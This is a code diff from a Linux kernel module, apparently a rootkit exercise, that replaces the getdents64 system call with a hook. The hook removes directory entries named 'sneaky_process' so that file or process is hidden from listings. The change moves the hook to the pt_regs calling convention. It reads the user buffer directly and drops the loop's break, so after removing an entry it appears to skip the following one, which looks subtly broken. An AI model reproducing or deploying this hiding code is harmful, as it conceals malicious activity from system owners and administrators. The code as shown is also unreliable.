@@ -45,27 +45,25 @@ int disable_page_rw(void *ptr){
 // 2. The asmlinkage keyword is a GCC #define that indicates this function
 //    should expect it find its arguments on the stack (not in registers).
 
-asmlinkage int (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirptr,unsigned int count);
+asmlinkage int (*original_getdents64)(struct pt_regs *regs);
 
-asmlinkage int sneaky_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirptr, unsigned int count)
+asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
 {
   //printk(KERN_INFO "Sneaky getdents is called.\n");
-  int nread,bpos;
   struct linux_dirent64* d;
-  nread = original_getdents64(fd,dirptr,count);
+  ssize_t nread;
+  ssize_t bpos;
+  nread = original_getdents64(regs);
   for(bpos=0;bpos<nread;){
-    d = (struct linux_dirent64 *)((char *)dirptr + bpos);
+    d = (struct linux_dirent64 *)((char *)regs->si + bpos);
     if (strcmp(d->d_name, "sneaky_process") == 0){
       int current_size = d->d_reclen;
-      int rest = ((char*)dirptr+nread) - ((char*)d+current_size);
+      int rest = ((char*)regs->si+nread) - ((char*)d+current_size);
       void* source = (char*)d + current_size;
       memmove(d,source,rest);
       nread -= current_size;
-      break;
     }
-    else{
-      bpos += d->d_reclen;
-    }
+    bpos += d->d_reclen;
   }
   return nread;
 }
